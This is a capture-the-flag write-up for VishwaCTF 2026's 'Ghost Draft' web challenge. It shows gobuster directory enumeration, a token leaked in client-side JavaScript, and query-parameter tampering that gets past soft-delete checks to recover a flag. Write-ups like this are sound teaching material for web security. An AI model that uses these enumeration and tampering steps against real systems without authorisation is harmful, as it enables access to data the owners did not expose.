---
title: Ghost Draft
ctf: VishwaCTF 2026
date: 2026-04-05
tags:
  - Web Exploitation
summary: Discovered a hidden draft mode via client-side JavaScript, accessed an internal API using a leaked token, and bypassed deletion logic to retrieve a Base64-encoded flag from an archived record.
---
---

# Ghost Draft – Writeup

## Challenge Description

An internal SecureDocs report was exposed. Everything looked normal, but some data behaved strangely. The goal was to find what was left behind.

---

## Step 1: Initial Recon

Opened the main site:

```
https://ghost.vishwactf.com/
```

It showed a simple page:

```
Welcome to Secure Docs
```

Nothing interesting here, so I moved to directory enumeration.

---

## Step 2: Directory Brute Force

Used `gobuster`:

```bash
gobuster dir -u https://ghost.vishwactf.com -w common.txt
```

### Results:

```
.well-known/http-opportunistic (Status: 200)
portal                        (Status: 200)
robots.txt                    (Status: 200)
```

* `/robots.txt` → not useful
* `/.well-known` → not useful
* `/portal` → **interesting**

---

## Step 3: Exploring `/portal`

Opened:

```
https://ghost.vishwactf.com/portal
```

Found a dashboard UI with:

* Notes system
* Hidden "View Notes" button
* Script file: `/script.js`

Also saw a comment:

```
<!--Status: Draft mode disabled-->
```

This hinted that **draft mode exists but is disabled**.

---

## Step 4: Analyzing `script.js`

Key part:

```javascript
const h = window.location.hash.replace("#", "");

if (h === "draft") {
    const encoded = "U29tZSByZWNvcmRzIG1heSBwZXJzaXN0IGJleW9uZCBleHBlY3RlZCBsaWZlY3ljbGUu";
    msg.innerText = atob(encoded);

    msg1.innerHTML = `
        <p>Draft environment loaded.</p>
        <p>Access endpoint: /api/notes?token=draftkey123</p>
    `;
}
```

### Key Observations:

* Uses **URL hash (`#draft`)**
* Base64 string decodes to:

  ```
  Some records may persist beyond expected lifecycle.
  ```
* Gives endpoint:

  ```
  /api/notes?token=draftkey123
  ```

---

## Step 5: Enable Draft Mode

Opened:

```
https://ghost.vishwactf.com/portal#draft
```

This:

* Revealed hidden message
* Enabled "View Notes" button
* Gave access to API

---

## Step 6: Access Notes API

Visited:

```
/api/notes?token=draftkey123
```

Got list of notes:

* `/note/1` to `/note/15`
* One entry:

  ```
  Archived Record (Unavailable)
  ```

This hinted:
 **Something deleted but still exists**

---

## Step 7: Testing Notes

Accessed notes:

Example:

```
/note/15
```

Response:

```json
{
  "content":"Team restructuring planned.",
  "deleted":false
}
```

### Observation:

All normal notes had:

```
"deleted": false
```

---

## Step 8: Finding Deleted Note

Tried:

```
/note/13
```

Response:

```json
{"error":"This record has been deleted."}
```

Now the earlier hint makes sense:

> "Some records may persist..."

---

## Step 9: Bypassing Deletion

Tried parameter manipulation:

```
/note/13?deleted=false
```

 Didn't work

Then:

```
/note/13?deleted=true
```

Response:

```json
{
  "error":"Password required",
  "hint":"Provide 'pass' parameter"
}
```

---

## Step 10: Using Known Token

Used the earlier token:

```
draftkey123
```

Final request:

```
/note/13?deleted=true&pass=draftkey123
```

---

## Step 11: Flag Extraction

Response:

```json
{
  "content":"cleanup pending – VmlzaHdhQ1RGe3MwRnRfZDNsZXQzXyFzX25PdF9kRWwzdGV9",
  "deleted":true
}
```

The string is Base64.

### Decode:

```
VmlzaHdhQ1RGe3MwRnRfZDNsZXQzXyFzX25PdF9kRWwzdGV9
```


---

## Final Flag

```
VishwaCTF{s0Ft_d3let3_!s_nOt_dEl3te}
```


## Summary

* Found hidden `/portal`
* Parameter manipulation (`deleted=true`)
* Extracted API endpoint + token
* Found deleted record (`/note/13`)
* Bypassed restriction using query params


PWN by **W4RR1OR**